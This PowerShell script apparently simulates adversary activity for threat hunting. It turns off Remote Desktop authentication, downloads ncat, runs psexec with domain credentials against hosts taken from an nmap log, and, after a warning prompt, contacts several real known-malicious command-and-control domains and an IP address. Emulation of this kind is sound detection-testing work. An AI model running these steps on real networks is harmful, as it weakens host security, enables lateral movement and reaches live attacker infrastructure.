# ___________.__                          __     ___ ___               __  
# \__    ___/|  |_________   ____ _____ _/  |_  /   |   \ __ __  _____/  |
#   |    |   |  |  \_  __ \_/ __ \\__  \\   __\/    ~    \  |  \/    \   __\
#   |    |   |   Y  \  | \/\  ___/ / __ \|  |  \    Y    /  |  /   |  \  |
#   |____|   |___|  /__|    \___  >____  /__|   \___|_  /|____/|___|  /__|
#                 \/            \/     \/             \/            \/  

# Enable Remote Desktop Connection
Write-Host "Set SetUserAuthenticationRequired to 0"
$Preferences = Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices
if ($Preferences.UserAuthenticationRequired -eq 1)
{
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
}

# Download Ncat
Write-Host "Download ncat-portable-5.59BETA1.zip from Nmap.org"
Invoke-WebRequest http://nmap.org/dist/ncat-portable-5.59BETA1.zip -OutFile $ThreatBox\tools\ncat.zip
Expand-Archive $ThreatBox\tools\ncat.zip -DestinationPath $ThreatBox\tools\ncat

# Grab available endpoints in network based on nmap scan and do psexec
Write-Host "Use results of Nmap to leverage PSExec"
$nmaplog = (Get-Content -Path $ThreatBox\logs\nmap.log | Where-Object {$_ -like '*Discovered open port*'})
$nmaplogip = ($nmaplog  |  Select-String -Pattern "\d{1,3}(\.\d{1,3}){3}" -AllMatches).Matches.Value
foreach ($nmapip in $nmaplogip) {
if (test-Connection -Cn $nmapip -quiet) {
    cd $ThreatBox\tools\
    psexec \\$nmapip -u $domainUser -p $DomainPass PowerShell ipconfig
} else {
    "$nmapip is not available"
}
}

# C2C communication
$reply = Read-Host -Prompt "Warning this step use curl.exe and Invoke-WebRequest to known bad IP/domains. Only proceed If you absolutely need/want."
if ( $reply -match "[yY]" ) { 

Write-Host "Use curl.exe to reach twitterdocs.com"
curl.exe --version twitterdocs.com

Write-Host "Use curl.exe to reach msupdater.com"
curl.exe --version msupdater.com

Write-Host "Use Invoke-WebRequest to reach msupdater.com"
Invoke-WebRequest -URI msupdater.com -UseBasicParsing

Write-Host "Use Invoke-WebRequest to reach sydwl.cn"
Invoke-WebRequest -URI sydwl.cn -UseBasicParsing

Write-Host "Use Invoke-WebRequest to reach dwn.rundll32.ml"
Invoke-WebRequest -URI dwn.rundll32.ml -UseBasicParsing

Write-Host "Use Invoke-WebRequest to reach twitterdocs.com"
Invoke-WebRequest -URI twitterdocs.com -UseBasicParsing

Write-Host "Use Invoke-WebRequest to reach www.aybc.so"
Invoke-WebRequest -URI www.aybc.so -UseBasicParsing

Write-Host "Use Invoke-WebRequest to reach a.ssvs.space"
Invoke-WebRequest -URI a.ssvs.space -UseBasicParsing

Write-Host "Use Invoke-WebRequest to reach 118.24.150.172"
Invoke-WebRequest -URI 118.24.150.172 -UseBasicParsing
}
